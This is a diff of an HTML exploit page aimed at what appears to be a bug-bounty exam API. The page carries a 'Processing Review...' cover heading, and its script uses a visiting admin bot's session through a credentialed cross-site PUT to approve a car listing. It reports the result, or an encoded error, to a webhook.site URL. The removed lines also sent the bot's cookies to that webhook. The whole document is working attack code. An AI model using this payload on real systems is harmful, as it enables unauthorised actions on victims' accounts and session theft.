@@ -1,22 +1,29 @@
 <html>
-  <body>
+<body>
+    <h1>Processing Review...</h1>
     <script>
-      const carId = "69dd69884e3edba5f08f60f9";
-      const webhook = "https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb";
+        // Use the car ID we've been working with
+        const carId = "69dd69884e3edba5f08f60f9";
+        const targetUrl = `https://api-bugbounty-exam.hashacademy.co/api/cars/${carId}`;
 
-      // 1. The Exploit: Try to approve the car using the Bot's session
-      fetch(`https://api-bugbounty-exam.hashacademy.co/api/cars/${carId}`, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ "status": "active", "isActive": true }),
-        credentials: 'include'
-      }).then(response => {
-        // 2. The Callback: Tell your webhook if the exploit worked
-        fetch(`${webhook}?status=${response.status}`);
-      });
-
-      // 3. The Bonus: Try to grab the Bot's cookie (if XSS is possible)
-      fetch(`${webhook}?cookie=` + btoa(document.cookie));
+        // Attempt to "Approve" the car using the Admin's session
+        fetch(targetUrl, {
+            method: 'PUT',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                "status": "active",
+                "isActive": true,
+                "availability": "available"
+            }),
+            credentials: 'include' // This is CRITICAL to use the bot's cookies
+        }).then(res => {
+            // Report the result back to your webhook
+            fetch(`https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?exploit_status=${res.status}`);
+        }).catch(err => {
+            fetch(`https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?error=${btoa(err)}`);
+        });
     </script>
-  </body>
+</body>
 </html>
